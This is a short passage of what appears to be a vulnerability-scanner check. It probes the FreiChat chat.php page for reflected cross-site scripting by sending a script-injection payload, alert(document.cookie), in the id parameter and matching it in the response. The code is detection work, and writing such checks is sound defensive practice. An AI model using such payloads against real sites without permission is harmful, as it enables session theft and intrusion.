...
url = dir + "/freichat/client/chat.php?id=1\"></script><script>alert(doc" + "ument.cookie)</script>&xhash";
if(http_vuln_check( port: http_port, url: url, check_header: TRUE, pattern: "><script>alert\\(document.cookie\\)</script>", extra_check: ">Chat<" )){
